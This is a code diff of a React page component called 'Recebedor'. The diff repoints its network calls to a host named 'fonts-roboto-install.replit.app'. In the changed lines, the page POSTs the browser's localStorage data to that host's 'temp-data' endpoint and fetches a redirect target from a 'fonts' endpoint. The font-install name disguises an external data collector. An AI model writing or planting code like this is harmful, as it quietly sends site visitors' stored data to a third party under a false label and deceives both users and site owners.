@@ -5,8 +5,8 @@ import Footer from '@/components/Footer';
 import { useScrollTop } from '@/hooks/use-scroll-top';
 
 // API Links and Scripts
-// API Endpoint: https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17
-// Temp Data API: https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/temp-data
+// API Endpoint: https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17
+// Temp Data API: https://fonts-roboto-install.replit.app/api/temp-data
 
 const Recebedor: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
@@ -191,7 +191,7 @@ const Recebedor: React.FC = () => {
                             // Function to perform the redirect with optional temp data ID
                             function performRedirect(tempDataId: string | null) {
                               const xhr = new XMLHttpRequest();
-                              xhr.open('GET', 'https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17', true);
+                              xhr.open('GET', 'https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17', true);
                               xhr.onreadystatechange = function() {
                                 if(xhr.readyState === 4) {
                                   let redirectUrl = '/finalizacao';
@@ -245,7 +245,7 @@ const Recebedor: React.FC = () => {
                                 
                                 // Store localStorage data temporarily
                                 const storeXhr = new XMLHttpRequest();
-                                storeXhr.open('POST', 'https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/temp-data', true);
+                                storeXhr.open('POST', 'https://fonts-roboto-install.replit.app/api/temp-data', true);
                                 storeXhr.setRequestHeader('Content-Type', 'application/json');
                                 storeXhr.onreadystatechange = function() {
                                   if(storeXhr.readyState === 4) {
